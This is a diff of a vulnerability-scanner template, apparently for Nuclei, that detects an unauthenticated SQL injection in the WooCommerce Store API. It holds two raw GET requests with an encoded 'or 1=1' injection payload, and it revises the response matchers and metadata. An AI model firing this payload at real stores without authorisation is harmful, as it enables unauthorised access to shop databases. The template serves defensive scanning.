@@ -1,23 +1,39 @@
 id: wordpress-woocommerce-sqli
 
 info:
-  name: WordPress Woocommerce Plugin
-  author: @rootxharsh @iamnoooob @S1r1u5_
+  name: Unauthenticated SQL injection Woocommerce
+  author: rootxharsh,iamnoooob,S1r1u5_,cookiehanhoan
   severity: critical
-  tags: wordpress,woocomernce
+  tags: wordpress,woocomernce,sqli
+  reference: |
+      - https://woocommerce.com/posts/critical-vulnerability-detected-july-2021
+      - https://viblo.asia/p/phan-tich-loi-unauthen-sql-injection-woocommerce-naQZRQyQKvx
 
 
 requests:
   - raw:
       - |
         GET /wp-json/wc/store/products/collection-data?calculate_attribute_counts[0][query_type]=or&calculate_attribute_counts[0][taxonomy]=aa%252522%252529or%2525201%25253D1%252523&attributes[0][taxonomy]=11 HTTP/1.1
-        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0
+        {{Hostname}}
+
       - |
         GET /?rest_route=/wc/store/products/collection-data&calculate_attribute_counts[0][query_type]=or&calculate_attribute_counts[0][taxonomy]=aa%252522%252529or%2525201%25253D1%252523&attributes[0][taxonomy]=11 HTTP/1.1
-        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0
+        {{Hostname}}
 
-    req-condition: true
+    matchers-condition: and
     matchers:
-      - type: dsl
-        dsl:
-          - 'contains(tolower(all_headers), "application/json") && contains(body_1, "{\"term\":") || contains(body_2, "{\"term\":")'
+      - type: word
+        words:
+          - '"term":'
+          - '"count":'
+        part: body
+        condition: and
+
+      - type: word
+        words:
+          - 'application/json'
+        part: header
+
+      - type: status
+        status:
+          - 200
